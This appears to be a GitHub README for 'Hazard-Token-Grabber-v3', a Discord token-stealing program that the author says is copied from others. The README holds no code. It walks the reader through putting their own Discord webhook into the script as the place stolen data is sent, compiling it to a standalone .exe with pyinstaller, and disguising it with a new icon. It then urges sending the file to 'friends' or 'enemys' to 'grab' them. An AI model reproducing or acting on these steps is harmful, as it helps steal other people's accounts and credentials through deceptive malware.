### â˜£ Hazard-Token-Grabber-v3 â˜£

> NOT MY WORK (SKIDDED)



Hello! I am pretty new on Github! Some days ago I found my old Hazard-Grabber directory and a repost with some changes from someone else. Enjoy this small remake.


As I said I'm new, but I will try my best <3
And yes, if you wanna call me that, you can call me a skid. That is the only thing I can do at the moment, but I'm trying to create my own projects. 
So don't worry, I'm not just a skid - I try my best!



**Tutorial for starters (like me..) â†“â†“**

- Step 1: Install python and make sure to add it to path. ![0_7nOyowsPsGI19pZT](https://user-images.githubusercontent.com/96620548/196215300-4d5ecf4a-7f7b-4c4b-9466-2b630873125e.png)

- Step 2: Enter the file named "hazard-v3.py" with any code editor. I would recommend you Visual Studio Code. (https://code.visualstudio.com/)

- Step 3: Just put your webhook in line 29 where the code says "WEBHOOK HERE". Simply replace the webhook here with your webhook. You don't know how to create a webhook and copy it's URL? https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks

- (Step 4:) You can also change the settings from line 30 to 37. (optional) True is enabling the setting, false is disbaling a setting. Easy!`

- Step 5: How do I compile this shit now? That's pretty easy! Just run this command after you opened a command prompt in the Hazard-Grabber Directory and run this command: "pyinstaller hazard-v3.py --onefile". Now wait for it to compile the file.

- (Step 6:) Change the ICON. (optional) I don't know good programs for this at the moment. I will try to add this soon. If you know how to do this, let me know under the "Issues" âž¤âž¤  "Suggestions" Tab.

- Step 7: Send the created .exe to your friends to troll them or grab your enemys!!

I'm learning coding at the moment to create my own projects and code, but I'm pretty young and broke, so please don't flame me ðŸ˜…
